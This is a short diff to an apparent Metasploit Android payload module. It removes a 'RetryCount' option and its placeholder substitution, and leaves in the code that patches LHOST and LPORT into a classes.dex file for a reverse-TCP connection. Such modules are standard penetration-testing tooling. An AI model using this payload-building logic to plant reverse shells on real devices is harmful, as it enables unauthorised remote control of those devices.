@@ -24,11 +24,6 @@ module Metasploit3
       'Handler'		=> Msf::Handler::ReverseTcp,
       'Stager'		=> {'Payload' => ""}
     ))
-
-    register_options(
-    [
-      OptInt.new('RetryCount', [true, "Number of trials to be made if connection failed", 10])
-    ], self.class)
   end
 
   def string_sub(data, placeholder, input)
@@ -42,7 +37,6 @@ module Metasploit3
 
     string_sub(classes, '127.0.0.1                       ', datastore['LHOST'].to_s) if datastore['LHOST']
     string_sub(classes, '4444                            ', datastore['LPORT'].to_s) if datastore['LPORT']
-    string_sub(classes, 'TTTT                                ', "TTTT" + datastore['RetryCount'].to_s) if datastore['RetryCount']
     jar.add_file("classes.dex", fix_dex_header(classes))
 
     files = [
